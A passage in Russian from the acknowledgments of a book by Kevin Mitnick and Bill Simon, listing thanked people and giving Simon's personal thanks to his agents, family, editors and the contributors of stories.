Томас Грин, Грег Гранберг, Дейв Харрисон, Марк Харди, Ларри Хойли, Лесли Херман, Майкл Хесс, Джим Хилл, Кен Холдер, Рашель Хорн-бакл, Эндрю «Bunnie» Нуанг. Линда Халл, Стив Хант, все крутые парни из IDC, Виргил Каспер, Стейси Киркленд, Эрик Ян Коедиджик, семейство Ламо, Лео и Дженифер Лапорт, Пэт Лоусон, Кэнди Лейман, Арно Ле-Ханг, Карен Левенталь, Боб Леви, Дэвид и Марк Литчфильд, Си Джи Литтл, Джонатан Литман, Марк Ловелесс, Lucky 225, Марк Майфретт, Ли Малис, Энди Мартон, Лапо Мазиеро, Форест МакДо-нальд, Керри МакЭлви, Джим «GonZo» МакАиалли, Поль и Викки Миллер, Элиотт Мур, Майкл Моррис, Винсент, Поль и Эйлин Наварило, Патрик и Сара Нортон, Джон Нунс, Шон Нунли, Джэнис Орси-но, Том Паркер, Кевин и Лорен Паульсен, Скотт Пресс, Линда и Арт Прайор, Pyr0, Джон Рафузе, Майк Роаддансер и вся команда безопасности из НОРЕ 2004, RGB, Израиль и Рэчел Розенкранц, Марк Росс, Билл Роил, Вильям Ройер, Джоэль «ch010man» Руис, Мартин Ракс, Райан Рассел, Брэд Сагарин, Мартин Сарджент, Лориан Симинас, Те Смит, Дан Сокол, Труди Спектор, Мэтт Сперджель, Грегори Спи-вак, Джим и Оливия Самнер, Дуглас Томас, Кэти Вон, Рон Ветцелъ, Эндрю Вильяме, Вилем, Дон Дэвид Вильсон, Джое Вильсон, Дейв и Дианна Выкофка и все мои друзья и помощники с сайта Labmistress.com и журнала 2600.   ОТ   БИЛЛА   САЙМОНА   При подготовке нашей первой книги «Искусство обмана» мы с Кевином Митником подружились. Во время написания второй книги мы продолжили эту дружбу углублять и находили все новые пути сотрудничества. Я считаю, что Кевин был главным компаньоном в нашем втором книжном путешествии.  Дэвид Фугейт, мой агент в издательстве Waterside Productions и тот, кто познакомил и соединил нас с Кевином, был всегда предельно внимателен и доброжелателен, устраняя даже незначительные трения между нами. Книга — дело непростое, и, когда дела начинают идти туго, каждому автору остается надеяться на своего агента, который должен быть не только мудрецом, но и настоящим другом. Именно таким другом мне стал Билл Глэдстоун, основатель Waterside Productions и мой главный агент. За то, что он всегда являл собой ключевой фактор успеха моей карьеры, ему мои особые благодарности.  Моя жена Айрин продолжает вдохновлять меня ежедневно всей своей любовью и неустанным стремлением к совершенству: я благодарен ей гораздо больше, чем могу выразить словами. Она существенно развила мои писательские навыки благодаря своей интеллигентности и желанию быть всегда впереди, постоянно говоря мне правду, когда мои «творения» не дотягивали до нужного уровня. Ей удавалось прорываться через поток моей ярости, который обычно был моей первой реакцией на ее критические отзывы, и, в конце концов, я всегда соглашался с мудростью ее предложений и переписывал свои тексты.  Марк Вильсон всегда умел протянуть мне руку помощи… Эмили Херман была настоящим чемпионом среди издателей, не уступает ей и Кевин Шафер, который занял ее место.  Даже работая над шестнадцатой книгой, хочется поблагодарить и тех, кто оказывал в работе даже небольшую помощь: среди многих имен мне особенно хочется упомянуть Кимберли Валентини и Мау-рин Малони из Waterside и Джозефин Родригес. Марианна Стабер как всегда делала свою обычную работу по разъяснению сокращений и терминов (что совсем не просто для странных технических терминов и сленга хакеров), а Джессика Даджеонвела всю бумажную работу. Дарси Вуд была настоящим чемпионом по скорости подготовки книги.  Хочу специально поблагодарить мою дочь Викторию и сына Шел-дона за их понимание и двух моих внуков — Винсента и Елену, всем им я обязательно буду уделять больше времени после завершения этой книги.  Всем тем, кто поведал нам свои рассказы, а особенно тем, чьи истории мы отобрали для печати, мы с Кевином особенно благодарны. Они пошли на это, несмотря на большой риск. Если бы их имена раскрылись, то, скорее всего, они были бы задержаны полицией. Даже те, чьи истории не были напечатаны, заслуживают восхищения за их смелость. Мы восхищены всеми!